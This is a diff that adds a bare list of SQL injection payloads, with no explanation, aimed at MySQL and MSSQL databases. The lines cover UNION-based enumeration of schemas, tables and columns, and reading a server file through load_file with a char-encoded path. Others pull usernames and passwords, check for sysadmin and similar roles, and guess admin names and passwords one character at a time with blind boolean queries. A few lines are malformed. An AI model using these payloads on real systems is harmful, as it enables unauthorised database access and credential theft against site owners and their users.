@@ -1,0 +1,54 @@
+; and 1=1 and 1=2
+order by x
+and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+and 1=2 union all select @@global.version_compile_os from mysql.user /*
+and ord(mid(user(),1,1))=114 /* 
+and 1=2 union select 1,user(),3,4,version(),database(),7,8,9,10,11,12,13,14,15,16
+and 1=2 union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),5,6,7,8/*
+and 1=2 union select 1,group_concat(schema_name) ,3,user(),load_file(char(99,58,92,98,111,111,116,46,105,110,105)),6,7,8,9,10,11 from information_schema.schemata--
+and 1=2 union select 1,group_concat(table_name) ,3,user(),load_file(char(99,58,92,98,111,111,116,46,105,110,105)),6,7,8,9,10,11 from information_schema.tables where table_schema=database()--
+and 1=2 union select 1,group_concat(column_name) ,3,user(),load_file(char(99,58,92,98,111,111,116,46,105,110,105)),6,7,8,9,10,11 from information_schema.columns where table_name=0x636F-- 
+and 1=2 union select 1,schema_name,3,4,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1/*
+and 1=2 union select 1,2,3,4,table_name,6,7,8,9,10 from information_schema.tables where TABLE_SCHEMA=0x686273746172735F636D73 limit 0,1/*
+and 1=2 union select 1,COLUMN_NAME,3,4,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=0x61666669636865 limit 0,1/*
+and 1=2 Union select 1,2,3,username,5,6,7,password,8,9 from tables limit 0,1
+and 1=2 Union select 1,2,3concat(username,0x3c,password),5,6,7,8,9 from tables limit 0,1
+and 1=(select is_srvrolemember('sysadmin'))
+and 1=(select is_srvrolemember('serveradmin'))
+and 1=(select is_srvrolemember('setupadmin'))
+and 1=(select is_srvrolemember('securityadmin'))
+and 1=(select is_srvrolemember('diskadmin'))
+and 1=(select is_srvrolemember('bulkadmin'))
+and exists(select * from sysobjects)
+and exists(select * from tableName) 
+and 1=(select @@VERSION)
+And 1=(select db_name())
+and 1=(select @@servername)
+and 1=(select IS_SRVROLEMEMBER('sysadmin'))
+and 1=(Select IS_MEMBER('db_owner'))
+and 1= (Select HAS_DBACCESS('master'))
+and 1=(select name from master.dbo.sysdatabases where dbid=1)
+and 0<>(select count(*) from *) 
+and 0<>(select count(*) from admin) 
+and 0<(select count(*) from admin) 
+and 1<(select count(*) from admin)
+and 1=(select count(*) from admin where len(*)>0)-- 
+and 1=(select count(*) from admin where len(name)>0) 
+and 1=(select count(*) from admin where len(_blank>password)>0)
+and 1=(select count(*) from admin where len(*)>0) 
+and 1=(select count(*) from admin where len(name)>6)  
+and 1=(select count(*) from admin where len(name)>5)  
+and 1=(select count(*) from admin where len(name)=6) 
+and 1=(select count(*) from admin where len(password)>11) 
+and 1=(select count(*) from admin where len(password)>12) 
+and 1=(select count(*) from admin where len(password)=12) 
+and 1=(select count(*) from admin where left(name,1)=a) --
+and 1=(select count(*) from admin where left(name,2)=ab)-- 
+and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) -- 
+and 1=(select name from master.dbo.sysdatabases where dbid=7)-- 
+and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) 
+and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U)
+and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin))
+and 0<>(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin 
+and uid>(str(id)))
+and 0<>(select top 1 name from bbs.dbo.syscolumns where id=18779569)
